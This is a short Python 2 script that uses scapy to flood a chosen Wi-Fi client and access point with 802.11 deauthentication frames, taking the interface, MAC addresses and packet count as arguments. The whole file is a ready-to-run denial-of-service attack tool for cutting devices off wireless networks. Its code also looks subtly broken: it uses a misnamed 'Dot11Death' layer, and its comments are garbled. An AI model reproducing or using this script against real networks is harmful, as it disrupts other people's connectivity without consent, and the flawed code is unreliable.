import sys
from scapy.all import *

# set arguman adaptor i face
conf.iface = sys.argv[1]
# set target accesspoint
apmac = sys.argv[2]
# set arguman client mac
clientmac = sys.argv[3]
# set packet number death
count = sys.argv[4]

conf.verb = 0


# set death packet
packet = RadioTap()/Dot11(type=0,subtype=12,addr1=clientmac,addr2=apmac,addr3=apmac)/Dot11Death(reason=7)



for n in range(int(count)):
    sendp(packet)
    print "sending packet to accesspoint:"+apmac+"and client"+clientmac
    